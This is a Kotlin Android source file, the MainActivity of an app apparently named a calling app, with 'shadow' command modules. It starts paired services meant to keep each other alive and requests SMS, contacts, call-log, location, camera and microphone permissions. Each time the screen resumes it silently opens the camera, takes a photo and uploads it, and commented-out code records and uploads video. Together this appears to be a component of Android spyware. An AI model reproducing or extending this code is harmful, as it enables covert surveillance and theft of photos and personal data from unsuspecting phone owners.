package com.hc.calling

import android.Manifest
import android.content.Intent
import android.os.Bundle
import android.support.v7.app.AppCompatActivity
import com.hc.calling.callingtransaction.R
import com.hc.calling.commands.shadow.data.ShadowVM
import com.hc.calling.commands.shadow.util.Photographer
import com.hc.permission.PermissonUtil
import com.orhanobut.logger.Logger
import kotlinx.android.synthetic.main.activity_main.*
import java.io.File


class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        //start two services for keep the mainly service alive
        val intent = Intent(this, MainService::class.java)
        val intent2 = Intent(this, KeeperService::class.java)
        startService(intent)
        startService(intent2)

        //request the permissions
        PermissonUtil.requestPermisson(
            this,
            arrayOf(
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.SEND_SMS,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO
            ),
            10000,
            object : PermissonUtil.PermissionCallBack {
                override fun refused(permission: String?) {
                }

                override fun permitted(permission: String?) {
                }
            })

        tv_btn_takephoto.setOnClickListener {
            //
//            GlobalScope.launch(Dispatchers.IO) {
//
//                VideoRecoder()
//                    .initMediaRecorde(path)
//                    .requestRecord(
//                        photographer!!.mCameraDevice!!,
//                        photographer!!.surfaces,
//                        photographer!!.handler!!
//                    )
//            }

        }

    }

    override fun onResume() {
        super.onResume()
        Photographer(this,
            { builder, session, device, imageReader, surface, handler ->

                Photographer.capture(builder, session, imageReader, device, handler)


//                val path = File(this.getExternalFilesDir(null), DateUtil.GetNowDate("yyyy-MM-ddHHmmss") + ".mp4").path
//
//                VideoRecoder {
//                    ShadowVM().upLoadPic(File(it)) {
//                        Logger.i(" upload finished")
//                    }
//                }
//                    .apply {
//                        initMediaRecorde(path)
//                            .apply {
//                                requestRecord(device, surface, handler)
//                            }
//                    }


            },
            {
                com.orhanobut.logger.Logger.i("img saved completed")
                ShadowVM().upLoadPic(File(it)) { data ->
                    Logger.i(data)
                }
            }
        ).openCamera("0")

    }

    override fun onDestroy() {
        super.onDestroy()
    }
}
